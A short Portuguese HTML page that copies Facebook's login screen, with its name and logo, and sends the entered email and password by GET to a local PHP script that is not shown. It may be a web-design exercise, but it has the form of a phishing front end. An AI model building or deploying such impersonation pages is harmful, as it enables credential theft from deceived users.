<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="facebook1.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel = "stylesheet" href = "css/estilos.css">
</head>
<body>
    <header class="cabecalho">
    <figure id="facebook">
        <img src = "img/facebook.png">
    </figure>
    <div class="formulario">
    <form action="Dados da Pagina.php"  method="GET">
        <div class="email">
        <legend>Digite seu E-mail:</legend>
        <input type="email" name="email" value="">
        </div>
        <div class="senha">
        <legend>Senha:</legend>
            <input type="password" name="senha" value="">
            
            <input type = "submit" class = "enviar" value = "Entrar">
    </form>
    </div>
    </header>
    <h1>Facebook Login</h1>
    <h2><strong>Criar uma nova conta.<br></strong>
        BemVindo(a) novamente ao Facebook!<br>
        Se você já possui uma conta,<br>
         acesse informando seu E-mail e Senha<br>
         nos campos logo acima para <br>
         acessar sua conta. Caso contrario,<br>
          você ainda não tenha uma conta,<br>
        Crie uma conta Clicando no botão<br>
         logo abaixo.</h2>

   <input type="submit" class="enviar2" name="Enviar" value="Criar conta">
</body>
</html>